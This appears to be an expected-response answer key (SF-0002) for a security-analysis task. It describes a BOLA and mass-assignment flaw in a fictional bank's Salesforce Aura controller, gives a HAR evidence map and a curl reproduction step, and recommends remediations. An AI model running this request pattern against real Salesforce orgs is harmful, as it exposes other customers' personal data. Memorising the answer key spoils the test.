# Expected Response

## System
- **Domain:** Financial Services / Retail Banking (Salesforce-Integrated)
- **System:** NexaBank Open Finance API (Salesforce-Integrated)
- **Example ID:** SF-0002

## Priority Findings

### Finding 1: Banking Salesforce — BOLA via Mass Assignment in Aura updateContact Exposes Cross-Tenant Contact/Account Data (Pattern 1.12)
**Severity:** Critical
**Category:** BOLA / Mass Assignment via Object Fields (Salesforce Aura)

**Summary:**
Per §4.0 (RISK-SF-002/RISK-SF-003): The `ContactController` Apex class is declared `without sharing`, meaning Salesforce sharing rules are not enforced. The SOQL query is missing an ownership check (`AND OwnerId = UserInfo.getUserId()`). Per §5.0 (Pattern 1.12 — mass assignment via object fields): the Aura `updateContact` action accepts a caller-supplied `fields` list including privileged object fields (`OwnerId`, `InternalNotes__c`, `SensitiveData__c`), enabling cross-ownership mass assignment. An attacker submitted `c.ContactController.updateContact` with `contactId: "001EFE9"` (belonging to `OwnerId: "005VICTIM"`) and received `SensitiveData__c: "SSN: 000-71-5059"` and `InternalNotes__c: "CONFIDENTIAL: internal review notes"`. In Financial Services / Retail Banking, exposure of customer SSNs and internal banking notes constitutes a PCI-DSS, GLBA, and PSD2 violation.

**Evidence from HAR:**
- Request: `POST https://7688efe9.lightning.force.com/aura`
- Aura action descriptor: `c.ContactController.updateContact`
- `aura.token`: `undefined`
- Params: `contactId: "001EFE9"`, `fields: ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]`
- Response `SUCCESS`: `Id: "001EFE9"`, `Name: "Victim Contact Record"`, `OwnerId: "005VICTIM"`, `InternalNotes__c: "CONFIDENTIAL: internal review notes"`, `SensitiveData__c: "SSN: 000-71-5059"`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-SF-002 | Controller declared `without sharing` — no sharing rules enforced |
| context.txt §4.0 | RISK-SF-003 | SOQL missing `AND OwnerId = UserInfo.getUserId()` |
| context.txt §5.0 | Pattern 1.12 | Mass assignment — client-supplied privileged fields accepted |
| HAR request | params.contactId | 001EFE9 — arbitrary victim contact ID |
| HAR request | params.fields | OwnerId, InternalNotes__c, SensitiveData__c (privileged fields) |
| HAR response | SensitiveData__c | SSN: 000-71-5059 (PII) |
| HAR response | InternalNotes__c | CONFIDENTIAL: internal review notes |
| HAR response | OwnerId | 005VICTIM (cross-ownership confirmed) |

## Steps to Reproduce

### Step 1 — Aura contactId substitution with mass-assignment fields (HAR)
```bash
curl -s -X POST 'https://7688efe9.lightning.force.com/aura' \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001EFE9","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```
**Vulnerable:** Returns victim banking contact including `SSN: 000-71-5059`. **Secure:** FORBIDDEN — `with sharing` enforced; privileged fields not in allowed list; SOQL restricted to caller ownership.

## Remediation
1. Declare `ContactController` as `with sharing` to enforce Salesforce object-level and record-level security.
2. Add `AND OwnerId = :UserInfo.getUserId()` to the SOQL WHERE clause.
3. Define a fixed server-side allowlist of returnable fields; reject any client-supplied `fields` parameter.
4. Validate `aura.token` as a valid, unexpired session before processing any Aura action.
5. Strip `OwnerId`, `InternalNotes__c`, and `SensitiveData__c` from default contact query response unless explicitly authorized.
